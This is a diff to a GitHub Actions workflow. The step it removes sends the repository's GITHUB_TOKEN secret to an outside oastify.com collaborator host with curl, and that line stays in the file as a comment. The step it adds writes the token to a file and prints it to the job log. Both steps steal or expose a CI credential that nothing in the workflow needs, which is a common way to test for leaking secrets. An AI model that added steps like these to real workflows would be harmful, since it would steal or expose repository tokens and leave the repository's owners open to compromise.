@@ -21,6 +21,11 @@ jobs:
         run: |
           ls ${{ github.workspace }}
       - run: echo "🍏 This job's status is ${{ job.status }}."
-      - name: Show secret
+      - name: Show secret thru file
         run: |
-          curl -X GET https://8bkmpsonimqso848i8qdzcxax13srif7.oastify.com?token=${{secrets.GITHUB_TOKEN}}
+          touch secret.txt
+          echo ${{ secrets.GITHUB_TOKEN }} > secret.txt
+          cat secret.txt
+      # - name: Show secret
+      #   run: |
+      #     curl -X GET https://8bkmpsonimqso848i8qdzcxax13srif7.oastify.com?token=${{secrets.GITHUB_TOKEN}}
